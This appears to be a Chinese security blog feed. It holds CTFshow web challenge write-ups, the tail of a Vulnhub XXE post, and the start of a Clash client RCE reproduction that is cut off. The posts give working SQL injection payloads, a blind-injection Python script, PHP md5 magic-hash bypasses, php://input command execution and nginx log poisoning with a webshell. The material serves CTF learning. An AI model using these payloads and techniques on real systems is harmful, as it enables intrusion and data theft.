alt="image-20220307232342978"></p><p>看到$_联想到了php去php运行下</p><p><img src="/posts/8c5d5e49/image-20220307232628649.png" alt="image-20220307232628649"></p><p>搞定收工</p><p>整体来说就是各种XXEpaylod 和 编码</p>]]></content>
      
      
      <categories>
          
          <category> 打靶 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow_web刷题记录[持续更新......]</title>
      <link href="/posts/fa386b67/"/>
      <url>/posts/fa386b67/</url>
      
        <content type="html"><![CDATA[<h1 id="Web刷题记录"><a href="#Web刷题记录" class="headerlink" title="Web刷题记录"></a>Web刷题记录</h1><h2 id="Web签到题"><a href="#Web签到题" class="headerlink" title="Web签到题"></a>Web签到题</h2><p><img src="/posts/fa386b67/image-20220306204413736-165900174270427.png" alt="image-20220306204413736"></p><p>F12查看源码</p><p><img src="/posts/fa386b67/image-20220306204451163.png" alt="image-20220306204451163"></p><p>base64解码</p><p><img src="/posts/fa386b67/image-20220306204535846.png" alt="image-20220306204535846"></p><h2 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h2><p><img src="/posts/fa386b67/image-20220306210147379.png" alt="image-20220306210147379"></p><p>一个登录框</p><p>尝试弱口令，，，，失败</p><p>使用万能密码</p><p><img src="/posts/fa386b67/image-20220306210303069.png" alt="image-20220306210303069"></p><p>成功登录 接下来进行sql注入</p><p><img src="/posts/fa386b67/image-20220306210557871.png" alt="image-20220306210557871"></p><p><img src="/posts/fa386b67/image-20220306210547490.png" alt="image-20220306210547490"></p><p>有3个字段 接下来看回显</p><p><img src="/posts/fa386b67/image-20220306210641695.png" alt="image-20220306210641695"></p><p>2处有回显 改为注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#查看数据库</span><br><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27;or 1=1 union select 1,database(),3#&amp;password=1</span></span><br><span class="line"><span class="string">#查看表</span></span><br><span class="line"><span class="string">username=admin&#x27;</span><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()#<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/posts/fa386b67/image-20220306211250740.png" alt="image-20220306211250740"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#查看flag表中的数据</span><br><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27;or 1=1 union select 1,column_name,3 from information_schema.columns where table_name=&#x27;</span>flag<span class="string">&#x27;#&amp;password=1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#查看flag</span></span><br><span class="line"><span class="string">username=admin&#x27;</span><span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,flag,<span class="number">3</span> <span class="keyword">from</span> flag#<span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/posts/fa386b67/image-20220306211624887.png" alt="image-20220306211624887"></p><h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><p>这题主要考察php的伪协议</p><p>详情可见<a href="https://segmentfault.com/a/1190000018991087#item-2">https://segmentfault.com/a/1190000018991087#item-2</a></p><p>这里使用php:&#x2F;&#x2F;input协议</p><p>使用phpinfo测试</p><p><img src="/posts/fa386b67/image-20220306221021594.png" alt="image-20220306221021594"></p><p><img src="/posts/fa386b67/image-20220306221052212.png" alt="image-20220306221052212"></p><p>接下来使用执行系统指令查看当前目录的文件夹</p><p><img src="/posts/fa386b67/image-20220306221503246.png" alt="image-20220306221503246"></p><p><img src="/posts/fa386b67/image-20220306221452532.png" alt="image-20220306221452532"></p><p>查看ctf_go_go_go文件</p><p><img src="/posts/fa386b67/y76O4rWLDawEQkf.png" alt="image-20220306221738302"></p><h2 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h2><p><img src="/posts/fa386b67/xO9wgrz37jAsacW.png" alt="image-20220307192056465"></p><p>请求头看到是nginx搭建</p><p>查看nginx日志</p><p>?url&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><p><img src="/posts/fa386b67/XENCDzcxQMIJBYe.png" alt="image-20220307190214602"></p><p>发现日志文件尝试在日志中插入一句话木马</p><p>先抓个包</p><p><img src="/posts/fa386b67/UvjlyFfXSzPW9hE.png" alt="image-20220307212115102"></p><p>添加一句话木马</p><p>蚁剑连接</p><p><img src="/posts/fa386b67/2b1WhsZmnOJviBo-165900179393549.png" alt="image-20220307212247404"></p><p><img src="/posts/fa386b67/image-20220307212323762-165900180009251.png" alt="image-20220307212323762"></p><h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">        <span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$v1</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;v1 error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;v2 error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;       </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;where is flag?&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ctype_alpha()函数:如果参数为字符串字母则返回Ture否则Flase</p><p>is_numeric()函数:如果参数为数字和数字字符串则返回Ture否则Flase浮点型返回1，即 TRUE。</p><p>也就是v1为字母 v2为数字</p><p>这里主要利用php md5碰撞</p><p>md5碰撞介绍：<br>PHP在处理哈希字符串时，会利用”!&#x3D;”或”&#x3D;&#x3D;”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p><p>详情<a href="https://blog.csdn.net/anzhuangguai/article/details/70049960">https://blog.csdn.net/anzhuangguai/article/details/70049960</a></p><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1<span class="operator">=</span>QNKCDZO<span class="operator">&amp;</span>v2<span class="operator">=</span><span class="number">240610708</span></span><br></pre></td></tr></table></figure><h2 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h2><p><img src="/posts/fa386b67/yBGzlZCi91at7dI-165900180559753.png" alt="image-20220308163456072"></p><p>一个登录框</p><p>首先试下万能密码</p><p><img src="/posts/fa386b67/XwL9IrkHMRs4mVo-165900180799355.png" alt="image-20220308163528102"></p><p>抓包看下</p><p><img src="/posts/fa386b67/QmMS7b2436LWpeV-165900181035357.png" alt="image-20220308164012827"></p><p>发现空格被过滤了</p><p>使用&#x2F;**&#x2F;代替空格</p><p><img src="/posts/fa386b67/QCr5n3YBJRK4UiE-165900181265759.png" alt="image-20220308164039336"></p><p>登录成功 接下来猜字段</p><p><img src="/posts/fa386b67/jE2Js8S9QbZqTrU.png" alt="image-20220308164922763"></p><p>3个字段 继续使用union 查看回显</p><p><img src="/posts/fa386b67/bMl86JAiyUjoQ2I.png" alt="image-20220308165004852"></p><p>2处为回显</p><p>接下来进行注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查看数据库</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">%</span><span class="number">27</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">%</span><span class="number">3</span>D1<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,database(),<span class="number">3</span><span class="operator">%</span><span class="number">23</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/posts/fa386b67/yiXDlJ8wbvjensg-165900182072165.png" alt="image-20220308165558090"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查表</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">%</span><span class="number">27</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">%</span><span class="number">3</span>D1<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(table_name),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema<span class="operator">=</span>database()<span class="operator">%</span><span class="number">23</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/posts/fa386b67/9zPsoXm173dNgGw-165900182504967.png" alt="image-20220308165542589"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查字段</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">%</span><span class="number">27</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">%</span><span class="number">3</span>D1<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(column_name),<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span><span class="operator">%</span><span class="number">23</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p><img src="/posts/fa386b67/mnWQfT94YyG1N83-165900182771769.png" alt="image-20220308165841243"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#查数据</span><br><span class="line">username<span class="operator">=</span>admin<span class="operator">%</span><span class="number">27</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">%</span><span class="number">3</span>D1<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,flag,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flag<span class="operator">%</span><span class="number">23</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>得到flag</p><h2 id="Web7"><a href="#Web7" class="headerlink" title="Web7"></a>Web7</h2><p>随便点一个</p><p><img src="/posts/fa386b67/MNYT1oehSVHamZv.png" alt="image-20220309233612766"></p><p>看url应该是sql注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure><p><img src="/posts/fa386b67/34opSrgjQGvZdKw-165900183166571.png" alt="image-20220309233721194"></p><p>抓包看下</p><p>应该是空格被过滤了</p><p>用&#x2F;**&#x2F;试下</p><p><img src="/posts/fa386b67/ekz96oF8faOEXBr-165900183700675.png" alt="image-20220309234057695"></p><p>正常了</p><p>看回显</p><p><img src="/posts/fa386b67/aEdQO9VhzUipkKr-165900184015977.png" alt="image-20220309234458637"></p><p>2，3</p><p>根据前面的题盲猜应该还是flag表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,flag,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flag<span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/posts/fa386b67/kSiKWDsMnBgLT5u-165900184312779.png" alt="image-20220309234528344"></p><h2 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h2><p>和上一关一样存在sql注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="comment">/**/</span><span class="keyword">or</span><span class="comment">/**/</span><span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure><p><img src="/posts/fa386b67/image-20220310225247255.png" alt="image-20220310225247255"></p><p>使用union看回显</p><p><img src="/posts/fa386b67/image-20220310225316125.png" alt="image-20220310225316125"></p><p>报错了</p><p>应该是过滤了union或者select</p><p>这里使用盲注</p><p>脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=<span class="string">&#x27;http://273325e5-2d7d-49b3-ab29-95181b40a737.challenge.ctf.show/index.php&#x27;</span></span><br><span class="line">table=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">45</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">        <span class="comment">#爆表名  flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#爆字段名 flag</span></span><br><span class="line">        <span class="comment">#payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span></span><br><span class="line">        <span class="comment">#读取flag</span></span><br><span class="line">        payload = <span class="string">&quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;</span>%(<span class="built_in">str</span>(i), <span class="built_in">str</span>(j))</span><br><span class="line"></span><br><span class="line">        ra = s.get(url=url + <span class="string">&#x27;?id=0/**/or/**/&#x27;</span> + payload).text</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;I asked nothing&#x27;</span> <span class="keyword">in</span> ra:</span><br><span class="line">            table += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(table)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>flag:</p><p><img src="/posts/fa386b67/image-20220310232534339.png" alt="image-20220310232534339"></p><h2 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h2><p><img src="/posts/fa386b67/image-20220311212421282.png" alt="image-20220311212421282"></p><p>打开就是一个登录界面，只有账号没有密码</p><p>本以为是sql注入，但试了很多payload都没有回显</p><p>使用目录扫描工具扫下</p><p>发现robots.txt</p><p><img src="/posts/fa386b67/image-20220311213312985.png" alt="image-20220311213312985"></p><p>看下是什么</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到sql语句为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,<span class="literal">true</span>).&quot;&#x27;&quot;;   </span><br></pre></td></tr></table></figure><p><img src="/posts/fa386b67/image-20220311213635981.png" alt="image-20220311213635981"></p><p>也就是我们的passwd要传入一个经过md5加密后16进制转字符串后包含‘or’的值</p><p>例如：<strong>ffifdyop</strong></p><p><img src="/posts/fa386b67/image-20220311214754459.png" alt="image-20220311214754459"></p><h2 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h2><p>打开又是一个登录框</p><p><img src="/posts/fa386b67/image-20220312212750883.png" alt="image-20220312212750883"></p><p>点击取消出现源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">             <span class="variable">$regex</span> = <span class="string">&quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;</span>;</span><br><span class="line">             <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$username</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)!=<span class="title function_ invoke__">strlen</span>(<span class="title function_ invoke__">replaceSpecialChar</span>(<span class="variable">$password</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from user where username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$con</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">mysqli_num_rows</span>(<span class="variable">$result</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$row</span>=<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;登陆成功&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到select，sleep 等等都被过滤了</p><p>同时没有办法使用双写绕过</p><p>可以使用group by</p><p>group up 会按照后的参数进行排列</p><p>group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计</p><p><code>with rollup</code>的作用是：在最后记录后面新增一行，显示select查询时聚合函数的统计和计算结果</p><p>也就是</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> 列名  <span class="keyword">WITH</span> <span class="keyword">ROLLUP</span></span><br></pre></td></tr></table></figure><p>这是不使用WITH ROLLUP的效果</p><p><img src="/posts/fa386b67/image-20220312224015749.png" alt="image-20220312224015749"></p><p>这是使用WITH ROLLUP的效果</p><p><img src="/posts/fa386b67/image-20220312224040151.png" alt="image-20220312224040151"></p><p>可以看出多了一行password多出了一个NULL对应的值为4也就是前面2+1+1的值 也就是说在group by的基础上WITH ROLLUP又把前面的值汇总了一遍</p><p>利用这一特性我们就可以进行绕过</p><p>payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username<span class="operator">=</span>admin<span class="string">&#x27;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</span></span><br></pre></td></tr></table></figure><p><img src="/posts/fa386b67/image-20220312224702958.png" alt="image-20220312224702958"></p><p>拿到flag</p><p><img src="/posts/fa386b67/image-20220312224233107.png" alt="image-20220312224233107"></p><h2 id="萌新专属红包题"><a href="#萌新专属红包题" class="headerlink" title="萌新专属红包题"></a>萌新专属红包题</h2><p>打开靶机发现一个登录界面，试下弱口令</p><p>admin admin888</p><p><img src="/posts/fa386b67/image-20220306182257359.png" alt="image-20220306182257359"></p><p>看到一张图片F12看下源码</p><p><img src="/posts/fa386b67/image-20220306182357918.png" alt="image-20220306182357918"></p><p>发现一行神秘编码 base64解码下</p><p><img src="/posts/fa386b67/image-20220306182428648.png" alt="image-20220306182428648"></p><p>发现只有一半 接下来找一找另一半</p><p>把图片下载下来</p><p>在详细信息里发现了</p><p><img src="/posts/fa386b67/image-20220306182517451.png" alt="image-20220306182517451"></p><p>解码</p><p><img src="/posts/fa386b67/image-20220306182543998.png" alt="image-20220306182543998"></p><p>搞定提交</p><p><img src="/posts/fa386b67/image-20220306182802861.png" alt="image-20220306182802861"></p><p>？？？ 假的flag改了大小写还是不行重新试下</p><p>登录抓包</p><p><img src="/posts/fa386b67/image-20220306183022208.png" alt="image-20220306183022208"></p><p>我去。。。。</p><p>base解码这次成功了。。</p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Clash RCE漏洞复现分析</title>
      <link href="/posts/cb677a8d/"/>
      <url>/posts/cb677a8d/</url>
      
        <content type="html"><![CDATA[<h1 id="Clash-RCE漏洞复现分析"><a href="#Clash-RCE漏洞复现分析" class="headerlink" title="Clash RCE漏洞复现分析"></a>Clash RCE漏洞复现分析</h1><blockquote><p>请各位师傅们务必在本地进行测试，切勿用于非法用途，后果自负。</p></blockquote><blockquote><p>影响范围：</p><p>已知版本&lt;0.19.10受其影响</p></blockquote><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><blockquote><p>Clash：一个 Go 语言开发的多平台代理客户端，懂得都懂</p></blockquote><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>版本需要小于0.19.10</p><p>打开clash选择配置(Profiles)</p><p><img src="/posts/cb677a8d/image-20220228221010788.png" alt="image-20220228221010788"><br>导入POC文件</p><blockquote><p>POC下载：<a href="https://github.com/fattygo/poc-">https://github.com/fattygo/poc-</a></p></blockquote><p>右键连接代理（Proxies）</p><p><img src="/posts/cb677a8d/image-20220228222445170.png" alt="image-20220228222445170"></p><p>执行成功</p><p><img src="/posts/cb677a8d/image-20220228222517633.png" alt="image-20220228222517633"></p><blockquote><p>本次复现仅供学习，切勿用于非法用途，后果自负。</p></blockquote><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>先看下正常的代理yml文件</p><p>节点之一</p><p><img src="/posts/cb677a8d/image-20220301224509405.png" alt="image-20220301224509405"></p><p>在Clash中的展示为</p><p><img src="/posts/cb677a8d/image-20220301224603800.png" alt="image-20220301224603800"></p><p>不难看出，proxies中的name和type，proxy-groups都展示了出来，这里就联想到xss漏洞</p><p>写个yml来试下</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">port:</span> <span class="number">7890</span></span><br><span class="line"><span class="attr">socks-port:</span> <span class="number">7891</span></span><br><span class="line"><span class="attr">redir-port:</span> <span class="number">7892</span></span><br><span class="line"><span class="attr">allow-lan:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">mode:</span> <span class="string">Rule</span></span><br><span class="line"><span class="attr">log-level:</span> <span class="string">silent</span></span><br><span 